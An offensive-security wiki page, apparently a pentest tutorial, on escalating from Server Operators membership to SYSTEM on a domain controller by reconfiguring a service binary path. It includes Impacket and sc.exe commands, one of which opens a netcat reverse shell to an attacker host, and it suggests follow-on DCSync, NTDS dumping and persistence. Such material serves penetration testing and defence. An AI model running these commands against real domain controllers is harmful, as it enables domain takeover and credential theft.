---
title: "Server Operators: reconfiguring a service to run as SYSTEM"
order: 10
description: "Abusing membership of the Server Operators group, which can manage services on domain controllers, to reconfigure a service's binary path to a malicious command and start it as LocalSystem."
keywords:
  - Server Operators
  - service reconfiguration
  - binPath
  - services.py
  - privilege escalation
---

# Server Operators

Members of **Server Operators** can log on to domain controllers and **manage services** on them. Windows services run as **LocalSystem** by default, and the group holds enough access to **reconfigure a service's binary path**. So you point an existing service at a command of your choosing, start it, and that command runs as SYSTEM on the DC, which is domain compromise. Like Backup Operators, this is Domain Admin by another name.

## The attack

```bash
# From Linux: Impacket services.py reconfigures and runs a service remotely
services.py 'EXAMPLE/svc_srvop:password@<dc>' change -name <service> -path 'C:\Windows\Temp\nc.exe -e cmd.exe <attacker> 443'
services.py 'EXAMPLE/svc_srvop:password@<dc>' start -name <service>
```

```text
# On-host equivalent with sc.exe (member of Server Operators)
sc.exe config <service> binPath= "C:\Windows\Temp\payload.exe"
sc.exe start <service>
```

Pick a service you can safely stop/start (or one set to run on demand); a common, low-impact choice is a rarely-used service you then restore. Your payload typically adds a domain admin or returns a SYSTEM shell.

## Exploitation notes

- The command runs as **LocalSystem on the DC**, so from there you DCSync, dump [NTDS](../authentication/credentials/ntds-and-dcsync.md), or add persistence.
- **Restore** the original `binPath` afterwards; a mangled service is both disruptive and an obvious artifact.
- Server Operators is a **protected** group ([AdminSDHolder](adminsdholder.md)-guarded), so you cannot usually add yourself to it through a weak ACL; you reach it by compromising an existing member.
- The same "reconfigure a SYSTEM service" idea applies to any service whose DACL you can write (weak service permissions), not only through Server Operators.

## Tools

- **Impacket `services.py`**: remote service change/start from Linux.
- **sc.exe / PowerShell `Set-Service`**: native on-host reconfiguration.
- **NetExec**: run the reconfigure/start over SMB.

## References

- [Hacking Articles: Server Operator group privilege escalation](https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/)
- [qazeer notes: operators to Domain Admins](https://notes.qazeer.io/active-directory/exploitation-operators_to_domain_admins)
- [HackTricks: privileged groups and token privileges](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html)
